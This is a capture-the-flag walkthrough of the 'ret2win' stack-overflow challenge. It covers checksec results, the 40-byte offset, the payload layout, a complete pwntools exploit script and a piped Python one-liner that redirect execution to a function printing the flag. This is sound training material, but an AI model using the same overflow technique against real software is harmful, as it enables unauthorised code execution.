# ret2win Exploit Walkthrough (Extreme Detail)

## Challenge Overview
- **Binary**: `ret2win` (ELF 64-bit, dynamically linked, not stripped).
- **Goal**: Redirect control flow to the hidden `ret2win()` function to print the flag by executing `system("/bin/cat flag.txt")`.
- **Vulnerability**: Classic stack buffer overflow in `pwnme()` due to `read(0, buf, 0x38)` into a 32-byte stack buffer without bounds checking.

## Reconnaissance
1. **Identify binary type**: `file ret2win` → 64-bit ELF, dynamic, symbols intact.
2. **Run binary**: Shows prompt asking for input; exits cleanly, indicating no stack protections blocking overflow (confirmed via `checksec` below).
3. **Checksec** (via `pwnlib.elf.ELF(checksec=True)` or `checksec`):
   - Canary: disabled
   - NX: enabled (so shellcode injection is out; we need ROP/ret2win)
   - PIE: disabled (static code addresses)
   - RELRO: partial

## Disassembly Highlights
- `main()` calls `pwnme()` and returns; after `pwnme()` finishes, `main()` prints a goodbye message and returns.
- `pwnme()` layout:
  - Allocates 0x20 (32) bytes local buffer on stack.
  - Zeroes it with `memset`.
  - Calls `read(0, buf, 0x38)` allowing **56 bytes** input into a **32-byte** buffer → 24 bytes overflow into saved `RBP` and return address.
- `ret2win()` function (at `0x400756`):
  - `puts("Well done! Here's your flag:")`
  - `system("/bin/cat flag.txt")`

## Offset Calculation (to control RIP)
- Use cyclic pattern: `cyclic 200` → send to program.
- Crash under GDB, then `cyclic -l <value at RIP>` (e.g., from `info registers rip`).
- Result: **40-byte offset** to reach saved RIP on this binary:
  - 32 bytes buffer + 8 bytes saved RBP = 40 bytes.

## Gadget/Target Addresses
- Target function: `ret2win` at `0x400756` (from `nm -g ret2win | grep ret2win` or `elf.sym['ret2win']`).
- Because PIE is off, address is static and can be used directly.

## Exploit Strategy
1. Send padding to reach saved RIP (40 bytes).
2. Overwrite RIP with the address of `ret2win()`.
3. (Optional) Add a return to `main` after `ret2win` to keep the process alive for interaction; not required for flag but used in script for stability.
4. NX is enabled, so we only reuse existing code; no shellcode.

## Final Payload Layout
```
[ 40 x 'A' ] + [ ret2win@0x400756 ] + [ main@0x400697 (optional) ]
```
- Little-endian packing is handled by `pwnlib.util.packing` via `flat()`.

## Exploit Script (`x.py`) Explained
```python
from pwn import *

r = process('./ret2win')
exe = context.binary = ELF('ret2win', checksec=False)

offset = 40
win = exe.sym['ret2win']

payload = flat(
    b'A' * offset,
    win,
    exe.sym['main']  # optional return for stability
)

r.sendline(payload)
r.interactive()
```
- `checksec=False` skips redundant checks once we know protections.
- `offset = 40` determined via cyclic pattern as described.
- `flat()` handles packing to 64-bit little-endian.
- `exe.sym['main']` is appended so the process doesn’t immediately exit after `ret2win`; the flag still prints before control returns.

## Reproducing the Exploit Manually (GDB-free)
1. Start the binary: `./ret2win`.
2. Pipe payload: `python3 -c "print('A'*40 + '\x56\x07\x40\x00\x00\x00\x00\x00')" | ./ret2win`
   - `0x400756` little-endian → `\x56\x07\x40\x00\x00\x00\x00\x00`.
3. Flag prints via `system("/bin/cat flag.txt")`.

## Reproducing with Pwntools (Preferred)
- Install pwntools: `pip install pwntools` (if not present).
- Run: `python3 x.py` from the `ret2win` directory.
- Observe interactive session showing the banner, then the flag output.

## Why the Exploit Works
- The overflow overwrites saved RIP because `read` writes 56 bytes into a 32-byte buffer.
- No stack canary → overwrite is unchecked.
- NX → must reuse existing code; `ret2win()` already contains the desired `system` call, so a single return jump suffices.
- No PIE → function addresses are fixed and known at runtime.

## Suggested Validations
- Run `checksec ret2win` to confirm protections.
- Run exploit under `gdb` with `r < <(python3 -c 'print("A"*40 + "\x56\x07\x40\x00\x00\x00\x00\x00")')` to verify RIP control.
- Verify flag prints when executing `python3 x.py`.

## Notes and Variations
- If ASLR interferes with libc but not binary text (PIE off), the direct code address still works.
- If you omit the return to `main`, the exploit still succeeds; process exits after printing flag.
- The buffer size and offset are consistent across runs because the binary is non-PIE with a stable stack frame size.
